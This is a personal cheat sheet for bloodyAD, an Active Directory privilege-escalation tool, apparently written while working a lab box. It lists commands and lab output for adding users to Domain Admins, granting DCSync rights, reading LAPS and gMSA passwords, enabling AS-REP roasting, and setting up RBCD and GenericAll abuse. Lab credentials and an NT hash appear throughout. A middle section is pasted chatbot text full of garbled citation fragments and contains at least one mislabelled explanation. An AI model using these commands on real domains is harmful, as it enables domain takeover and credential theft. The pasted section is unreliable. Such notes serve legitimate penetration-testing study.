
https://github.com/CravateRouge/bloodyAD
All commands list: https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
Enumeration examples: https://github.com/CravateRouge/bloodyAD/wiki/Enumeration

The bloodyAD commands consists of two parts:
- the information - domain, host, username and password
  like `bloodyAD --host 10.10.232.197 -d spookysec.local -u svc-admin -p 'management2005'`
- the qurey - get/set/add/remove something
  like `add user newuser Password123!`
making the full command: `bloodyAD --host 10.10.232.197 -d spookysec.local -u svc-admin -p 'management2005' add user newuser Password123!`

below I will only write out the second part for readability (except for the examples)

create user account
`add user --ou "OU=Staff,DC=spookysec,DC=local" newuser Password123!`

add user to group
`add groupMember 'Domain Admins' newuser`

add dcsync permissions
`add dcsync newuser`

create computer account


setting other users password
`set password john.doe 'Password123!'`


get members of the Domain Admins group
`get object 'Domain Admins' --attr member`

list all users (using a search)
`get search --filter "(objectClass=user)"`

show the domain's minimum password length policy (minPwdLength)
`get object 'DC=spookysec,DC=local' --attr minPwdLength`

check domain functional version
`get object 'DC=spookysec,DC=local' --attr msDS-Behavior-Version`

get dns dump
`get dnsDump`

get account "controls" like disabled..
`get object guest --attr userAccountControl`

view writable objects
`get writable --otype ALL --right WRITE --detail`
### Examples

Getting the members of the Domain Admins group
```sh
┌──(fixit42㉿kali)-[~/boxes]
└─$ bloodyAD -d spookysec.local --host 10.10.232.197 -u svc-admin -p 'management2005' get object 'Domain Admins' --attr member

distinguishedName: CN=Domain Admins,CN=Users,DC=spookysec,DC=local
member: CN=Admin Spooks,OU=Administrator,DC=spookysec,DC=local; CN=Administrator,CN=Users,DC=spookysec,DC=local
```

get dns dump
```sh
┌──(fixit42㉿kali)-[~/boxes]
└─$ bloodyAD -d spookysec.local --host 10.10.232.197 -u svc-admin -p 'management2005' get dnsDump

zoneName: spookysec.local

SOA.PrimaryServer: attacktivedirectory.spookysec.local
SOA.zoneAdminEmail: hostmaster@spookysec.local
NS: attacktivedirectory.spookysec.local
A: 192.168.100.8
recordName: spookysec.local
...
```

get account "controls" like disabled..
```sh
┌──(fixit42㉿kali)-[~/boxes]
└─$ bloodyAD -d spookysec.local --host 10.10.232.197 -u svc-admin -p 'management2005' get object guest --attr userAccountControl

distinguishedName: CN=Guest,CN=Users,DC=spookysec,DC=local
userAccountControl: ACCOUNTDISABLE; PASSWD_NOTREQD; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
```

get OUs
```sh
┌──(fixit42㉿kali)-[~/boxes]
└─$ bloodyAD -d spookysec.local --host 10.10.232.197 -u svc-admin -p 'management2005' get children --otype organizationalUnit

distinguishedName: OU=Domain Controllers,DC=spookysec,DC=local

distinguishedName: OU=Staff,DC=spookysec,DC=local

distinguishedName: OU=Administrator,DC=spookysec,DC=local
```

get users (short form)
```sh
┌──(fixit42㉿kali)-[~/boxes]
└─$ bloodyAD -d spookysec.local --host 10.10.232.197 -u svc-admin -p 'management2005' get children --otype user              

distinguishedName: CN=Administrator,CN=Users,DC=spookysec,DC=local

distinguishedName: CN=Guest,CN=Users,DC=spookysec,DC=local

distinguishedName: CN=ATTACKTIVEDIREC,OU=Domain Controllers,DC=spookysec,DC=local
...
```

create user
```sh
┌──(fixit42㉿kali)-[~/boxes]
└─$ bloodyAD --host 10.10.232.197 -d spookysec.local -u Administrator -p :0e0363213e37b94221497260b0bcb4fc add user newuser Password123!
[+] newuser created

┌──(fixit42㉿kali)-[~/boxes]
└─$ bloodyAD --host 10.10.232.197 -d spookysec.local -u backup -p backup2517860 add user --ou "CN=Users,DC=spookysec,DC=local" newuser3 Password123!
[+] newuser2 created
```

add dcsynd perms to user
```sh
┌──(fixit42㉿kali)-[~/boxes]
└─$ bloodyAD --host 10.10.232.197 -d spookysec.local -u backup -p backup2517860 add dcsync newuser3
[+] newuser3 is now able to DCSync
```
### To test

Set "DONT_REQ_PREAUTH" (for AS-REP roast)

bloodyAD -u Administrator -d bloody.local -p Password512! --host 192.168.10.2 add uac john.doe DONT_REQ_PREAUTH

Clear the ACCOUNTDISABLE flag

bloodyAD -u Administrator -d bloody.local -p Password512! --host 192.168.10.2 remove uac john.doe ACCOUNTDISABLE

Reactivates a previously disabled account
notes.incendium.rocks+1Kali Linux Tutorials+1
.

Read GMSA managed password

bloodyAD -u john.doe -d bloody.local -p Password512! --host 192.168.10.2 get object 'gmsaAccount$' --attr msDS-ManagedPassword

Exfiltrate managed service account credentials
Kali Linux Tutorials+2notes.incendium.rocks+2GitHub+2
.

Retrieve LAPS password for a computer account

bloodyAD -u john.doe -d bloody.local -p Password512! --host 192.168.10.2 get object 'COMPUTER$' --attr ms-Mcs-AdmPwd

Extracts the local admin password of computers managed via LAPS
Kali Linux Tutorials+2notes.incendium.rocks+2GitHub+2
Kali Linux Tutorials
.

Identify machine account creation quota

bloodyAD -u john.doe -d bloody.local -p Password512! --host 192.168.10.2 get object 'DC=bloody,DC=local' --attr ms-DS-MachineAccountQuota

Indicates how many new machine accounts you can create (unconstrained delegation)
docs.cryeye.net
BorderGate+1GitHub+1
.

Add Resource-Based Constrained Delegation (RBCD)

bloodyAD -d dev.admin.offshore.com --host 172.16.2.6 -u Joe -p :<nt-hash> add rbcd DC02$ joe

Grants impersonation rights — enabling S4U2proxy attacks
Siberoloji+15notes.incendium.rocks+15GitHub+15
.

Inject DCSYNC rights on a target account

bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :<nt-hash> add dcsync administrator

Assigns replication rights to pull password hashes from DC
GitHub+4notes.incendium.rocks+4Kali Linux Tutorials+4
BorderGate+1docs.cryeye.net+1
.

Grant full GenericAll rights against a computer/account

    bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :<nt-hash> add genericAll MS01$ administrator

    Elevates privileges over the specified object
    Knowledge Base (KB)+3notes.incendium.rocks+3Ethical Hackers Academy+3
    .

✅ Summary Table
Use-Case	Command Example
Enum domain users	get children --type user
View DNS records	get dnsDump
Exfil LAPS credentials	get object <computer>$ --attr ms-Mcs-AdmPwd
Enable AS-REP roast	add uac <user> DONT_REQ_PREAUTH
Set up RBCD attack	add rbcd <machine>$ <user>
Grant DCSYNC rights	add dcsync <target>
Claim GenericAll rights	add genericAll <object> <principal>

Each command above has been pulled directly from real-world documentation, GitHub wiki, or pentest articles
Pentesting.Site+14notes.incendium.rocks+14BorderGate+14
docs.cryeye.net+1Pentesting.Site+1
GitHub+1exploit-notes.hdks.org+1
wiki.pentestlist.com+1GitHub+1
Kali Linux Tutorials
. Use these as a reliable foundation for enumeration, privilege escalation, and AD exploitation with bloodyAD. Let me know if you'd like guidance on chaining them or interpreting results!







### Help

```sh
┌──(fixit42㉿kali)-[~]
└─$ bloodyAD 
usage: bloodyAD [-h] [-d DOMAIN] [-u USERNAME] [-p PASSWORD] [-k [KERBEROS ...]] [-f {b64,hex,aes,rc4,default}]
                [-c [CERTIFICATE]] [-s] [--host HOST] [--dc-ip DC_IP] [--dns DNS] [--gc] [-v {QUIET,INFO,DEBUG}]
                {add,get,remove,set} ...

AD Privesc Swiss Army Knife

options:
  -h, --help            show this help message and exit
  -d, --domain DOMAIN   Domain used for NTLM authentication
  -u, --username USERNAME
                        Username used for NTLM authentication
  -p, --password PASSWORD
                        password or LMHASH:NTHASH for NTLM authentication, password or AES/RC4 key for kerberos, password
                        for certificate(Do not specify to trigger integrated windows authentication)
  -k, --kerberos [KERBEROS ...]
                        Enable Kerberos authentication. If '-p' is provided it will try to query a TGT with it. You can also
                        provide a list of one or more optional keywords as '-k kdc=192.168.100.1 kdcc=192.168.150.1
                        realmc=foreign.realm.corp <keyfile_type>=/home/silver/Admin.ccache', <keyfile_type> being ccache,
                        kirbi, keytab, pem or pfx, 'kdc' being the kerberos server for the keyfile provided and 'realmc' and
                        'kdcc' for cross realm (the realm of the '--host' provided)
  -f, --format {b64,hex,aes,rc4,default}
                        Specify format for '--password' or '-k <keyfile>'
  -c, --certificate [CERTIFICATE]
                        Certificate authentication, e.g: "path/to/key:path/to/cert" (Use Windows Certstore with krb if left
                        empty)
  -s, --secure          Try to use LDAP over TLS aka LDAPS (default is LDAP)
  --host HOST           Hostname or IP of the DC (ex: my.dc.local or 172.16.1.3)
  --dc-ip DC_IP         IP of the DC (useful if you provided a --host which can´t resolve)
  --dns DNS             IP of the DNS to resolve AD names (useful for inter-domain functions)
  --gc                  Connect to Global Catalog (GC)
  -v, --verbose {QUIET,INFO,DEBUG}
                        Adjust output verbosity

Commands:
  {add,get,remove,set}
    add                 [ADD] function category
    get                 [GET] function category
    remove              [REMOVE] function category
    set                 [SET] function category
```

##### get commands help

```sh
┌──(fixit42㉿kali)-[~]
└─$ bloodyAD get -h
usage: bloodyAD get [-h] {children,dnsDump,membership,object,search,trusts,writable} ...

options:
  -h, --help            show this help message and exit

get commands:
  {children,dnsDump,membership,object,search,trusts,writable}
    children            List children for a given target object
    dnsDump             Retrieve DNS records of the Active Directory readable/listable by the user
    membership          Retrieve SID and SAM Account Names of all groups a target belongs to
    object              Retrieve LDAP attributes for the target object provided, binary data will be outputted in base64
    search              Search in LDAP database, binary data will be outputted in base64
    trusts              Display trusts in an ascii tree starting from the DC domain as tree root. A->B means A can auth on B
                        and A-<B means B can auth on A, A-<>B means bidirectional
    writable            Retrieve objects writable by client
```


##### set commands help

```sh
┌──(fixit42㉿kali)-[~]
└─$ bloodyAD set -h
usage: bloodyAD set [-h] {object,owner,password} ...

options:
  -h, --help            show this help message and exit

set commands:
  {object,owner,password}
    object              Add/Replace/Delete target´s attribute
    owner               Changes target ownership with provided owner (WriteOwner permission required)
    password            Change password of a user/computer
```

